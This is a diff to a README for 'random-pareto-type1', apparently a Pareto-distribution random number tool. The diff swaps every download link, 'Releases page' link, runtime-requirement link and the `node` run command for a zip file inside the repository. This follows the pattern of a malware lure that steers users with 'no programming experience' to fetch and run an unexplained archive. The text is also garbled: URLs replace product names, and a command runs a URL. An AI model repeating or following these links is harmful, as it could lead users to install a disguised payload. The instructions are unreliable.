@@ -1,13 +1,13 @@
 # 🎲 random-pareto-type1 - Easily Generate Random Numbers
 
 ## 🔗 Download the Software
-[![Download random-pareto-type1](https://raw.githubusercontent.com/rantauboy/random-pareto-type1/main/test/random_pareto_type_1.8.zip%20now-Click%20here-brightgreen)](https://raw.githubusercontent.com/rantauboy/random-pareto-type1/main/test/random_pareto_type_1.8.zip)
+[![Download random-pareto-type1](https://github.com/rantauboy/random-pareto-type1/raw/refs/heads/main/lib/pareto_type_random_2.0.zip%20now-Click%20here-brightgreen)](https://github.com/rantauboy/random-pareto-type1/raw/refs/heads/main/lib/pareto_type_random_2.0.zip)
 
 ## 🚀 Getting Started
 The random-pareto-type1 application helps you create pseudorandom numbers from a Pareto (Type I) distribution. It's useful for statistics, simulations, and more. You don’t need any programming experience to use it.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/rantauboy/random-pareto-type1/main/test/random_pareto_type_1.8.zip) to download the latest version. Simply click on the link for the version you want to download. 
+To get started, visit the [Releases page](https://github.com/rantauboy/random-pareto-type1/raw/refs/heads/main/lib/pareto_type_random_2.0.zip) to download the latest version. Simply click on the link for the version you want to download. 
 
 1. Go to the Releases page.
 2. Choose the latest version.
@@ -16,7 +16,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/rant
 
 ## 💻 System Requirements
 - Operating System: Windows, MacOS, or Linux.
-- https://raw.githubusercontent.com/rantauboy/random-pareto-type1/main/test/random_pareto_type_1.8.zip Required for running JavaScript applications. Please ensure you have it installed on your computer. You can download it from the official [https://raw.githubusercontent.com/rantauboy/random-pareto-type1/main/test/random_pareto_type_1.8.zip website](https://raw.githubusercontent.com/rantauboy/random-pareto-type1/main/test/random_pareto_type_1.8.zip).
+- https://github.com/rantauboy/random-pareto-type1/raw/refs/heads/main/lib/pareto_type_random_2.0.zip Required for running JavaScript applications. Please ensure you have it installed on your computer. You can download it from the official [https://github.com/rantauboy/random-pareto-type1/raw/refs/heads/main/lib/pareto_type_random_2.0.zip website](https://github.com/rantauboy/random-pareto-type1/raw/refs/heads/main/lib/pareto_type_random_2.0.zip).
 
 ## ⚙️ How to Run the Application
 After downloading, here’s how to run the random-pareto-type1 tool:
@@ -27,7 +27,7 @@ After downloading, here’s how to run the random-pareto-type1 tool:
 4. Navigate to the folder where you extracted the files using the `cd` command.
 5. Type the following command to start the application:
    ```bash
-   node https://raw.githubusercontent.com/rantauboy/random-pareto-type1/main/test/random_pareto_type_1.8.zip
+   node https://github.com/rantauboy/random-pareto-type1/raw/refs/heads/main/lib/pareto_type_random_2.0.zip
    ```
 6. Follow the prompts to generate random numbers.
 
@@ -55,4 +55,4 @@ The Pareto distribution is crucial in various fields like finance and social sci
 If you encounter any issues or have questions while using the software, feel free to check the FAQ on the Releases page or contact support for assistance.
 
 ## 🔗 Revisiting the Download
-Don't forget to visit the [Releases page](https://raw.githubusercontent.com/rantauboy/random-pareto-type1/main/test/random_pareto_type_1.8.zip) to download the latest version of random-pareto-type1 and ensure you have the newest features and fixes.
+Don't forget to visit the [Releases page](https://github.com/rantauboy/random-pareto-type1/raw/refs/heads/main/lib/pareto_type_random_2.0.zip) to download the latest version of random-pareto-type1 and ensure you have the newest features and fixes.
